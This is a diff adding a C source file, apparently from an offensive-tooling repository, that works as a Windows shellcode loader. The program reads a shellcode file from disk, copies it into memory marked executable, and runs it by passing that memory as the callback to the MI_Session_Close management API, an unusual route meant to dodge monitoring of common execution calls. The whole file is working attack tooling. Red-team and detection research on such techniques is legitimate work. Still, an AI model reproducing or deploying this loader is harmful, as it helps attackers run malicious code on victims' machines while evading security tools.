@@ -1,0 +1,69 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Mi.lib")
+
+#include <stdio.h>
+#include <windows.h>
+#include <mi.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: MI_Session_Close.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+	
+	MI_Application sMIApp = { 0 };
+	MI_Session sMISess = { 0 };
+
+	MI_Application_InitializeV1(0, NULL, NULL, &sMIApp);
+
+	MI_Application_NewSession(&sMIApp, NULL, NULL, NULL,
+		NULL, NULL, &sMISess);
+
+	MI_Session_Close(&sMISess, NULL, hAlloc); //Worked for small shellcode
+
+	MI_Application_Close(&sMIApp);
+	
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
